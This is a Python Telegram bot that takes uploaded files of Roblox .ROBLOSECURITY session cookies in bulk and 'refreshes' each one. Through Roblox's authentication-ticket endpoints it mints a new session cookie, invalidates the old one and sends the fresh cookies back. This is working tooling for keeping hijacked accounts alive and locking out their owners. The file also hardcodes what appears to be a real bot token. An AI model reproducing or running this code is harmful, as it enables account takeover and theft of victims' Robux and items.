import asyncio
import requests
import re
import time
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.types import FSInputFile
from aiogram.fsm.storage.memory import MemoryStorage

TOKEN = "8145614744:AAFSqIjLnxlvEPEhe9e1U_Vbcw6SOBdiHH0"

bot = Bot(token=TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

class Bypass:
    def __init__(self, cookie: str) -> None:
        if not isinstance(cookie, str) or not cookie:
            raise ValueError("Необходимо передать непустую строку с куки.")
        self.cookie = cookie
        self.xcsrf_token = None
        self.rbx_authentication_ticket = None
        self.session = requests.Session()
        self.session.cookies[".ROBLOSECURITY"] = self.cookie
        self.session.headers["User-Agent"] = "Roblox/WinInet"
        self.session.headers["Accept"] = "application/json"
        self.session.headers["Accept-Language"] = "en-US,en;q=0.9"

    def get_csrf_token(self) -> bool:
        logout_url = "https://auth.roblox.com/v2/logout"
        try:
            response = self.session.post(logout_url, timeout=15)
            if "x-csrf-token" in response.headers:
                self.xcsrf_token = response.headers["x-csrf-token"]
                self.session.headers["x-csrf-token"] = self.xcsrf_token
                return True
            return False
        except requests.exceptions.RequestException:
            return False

    def get_rbx_authentication_ticket(self) -> bool:
        if not self.xcsrf_token:
            return False
        ticket_url = "https://auth.roblox.com/v1/authentication-ticket"
        headers = {
            "rbxauthenticationnegotiation": "1",
            "referer": "https://www.roblox.com/camel",
            "Content-Type": "application/json"
        }
        try:
            response = self.session.post(ticket_url, headers=headers, timeout=15)
            ticket = response.headers.get("rbx-authentication-ticket")
            if ticket:
                self.rbx_authentication_ticket = ticket
                return True
            return False
        except requests.exceptions.RequestException:
            return False

    def get_set_cookie(self) -> str | None:
        if not self.rbx_authentication_ticket:
            return None
        redeem_url = "https://auth.roblox.com/v1/authentication-ticket/redeem"
        headers = {"rbxauthenticationnegotiation": "1"}
        payload = {"authenticationTicket": self.rbx_authentication_ticket}
        try:
            response = requests.post(redeem_url, headers=headers, json=payload, timeout=15)
            set_cookie_header = response.headers.get("set-cookie")
            if set_cookie_header and ".ROBLOSECURITY=" in set_cookie_header:
                match = re.search(r"\.ROBLOSECURITY=(_\|WARNING:-DO-NOT-SHARE-THIS.*?)(?:;|$)", set_cookie_header)
                if match:
                    return match.group(1)
            return None
        except requests.exceptions.RequestException:
            return None

    def invalidate_old_cookie(self) -> bool:
        if not self.xcsrf_token:
            return False
        logout_url = "https://auth.roblox.com/v2/logout"
        try:
            response = self.session.post(logout_url, timeout=10)
            return response.status_code in [200, 403]
        except requests.exceptions.RequestException:
            return False

    def start_process(self) -> str | None:
        if not self.get_csrf_token():
            return None
        if not self.get_rbx_authentication_ticket():
            return None
        new_cookie = self.get_set_cookie()
        if new_cookie:
            self.invalidate_old_cookie()
            return new_cookie
        return None

def cookie_fresher(old_cookie_input: str) -> str | None:
    if not old_cookie_input or not isinstance(old_cookie_input, str):
        return None

    old_cookie = old_cookie_input.strip()
    if "_|WARNING:-DO-NOT-SHARE-THIS" in old_cookie:
        try:
            prefix = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
            if prefix in old_cookie:
                old_cookie = old_cookie.split(prefix)[-1]
            elif "|_" in old_cookie:
                old_cookie = old_cookie.split("|_")[-1]
        except (IndexError, ValueError):
            return None
    elif old_cookie.startswith(".ROBLOSECURITY="):
        old_cookie = old_cookie.split(".ROBLOSECURITY=")[1].split(";")[0]

    if not old_cookie:
        return None

    time.sleep(0.3)

    bypass_instance = Bypass(old_cookie)
    try:
        new_cookie = bypass_instance.start_process()
        if new_cookie:
            return new_cookie
        return None
    except Exception:
        return None

@dp.message()
async def handle_document(message: types.Message):
    if not message.document:
        await message.reply("Пожалуйста, отправьте файл с куками (.txt)")
        return

    if not message.document.file_name.endswith(".txt"):
        await message.reply("Нужен файл с расширением .txt")
        return

    await message.reply("🔄 Обрабатываю файл, подождите...")

    file_id = message.document.file_id
    file = await bot.get_file(file_id)
    file_path = file.file_path

    file_bytes_io = await bot.download_file(file_path)
    content = file_bytes_io.read().decode("utf-8").splitlines()

    start_time = time.time()

    fresh_lines = []
    invalid_count = 0
    seen_cookies = set()

    for line in content:
        line = line.strip()
        if not line:
            continue
        if "_|WARNING" in line:
            new_cookie = cookie_fresher(line)
            if new_cookie:
                fresh_lines.append(new_cookie)
            else:
                invalid_count += 1
        else:
            invalid_count += 1

    # Удаляем дубликаты среди обновленных
    unique_fresh_lines = list(dict.fromkeys(fresh_lines))  # сохраняет порядок и удаляет дубликаты
    duplicates_removed = len(fresh_lines) - len(unique_fresh_lines)

    if not unique_fresh_lines:
        await message.reply("❌ Не удалось обновить ни одного куки. Возможно, файл пуст или куки невалидны.")
        return

    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    output_filename = f"FreshCookies_{timestamp}.txt"

    with open(output_filename, "w", encoding="utf-8") as f:
        for fresh in unique_fresh_lines:
            f.write(fresh + "\n")

    elapsed_time = time.time() - start_time

    file_to_send = FSInputFile(output_filename)
    await message.reply_document(file_to_send)

    stats_message = (
        f"✅ Обработка завершена!\n"
        f"🔄 Обновлено кук: {len(unique_fresh_lines)}\n"
        f"❌ Невалидных кук: {invalid_count}\n"
        f"🗑 Дубликатов удалено: {duplicates_removed}\n"
        f"⏱ Время обработки: {elapsed_time:.2f} секунд"
    )
    await message.answer(stats_message)

if __name__ == "__main__":
    print("✅ Бот запущен...")
    asyncio.run(dp.start_polling(bot))
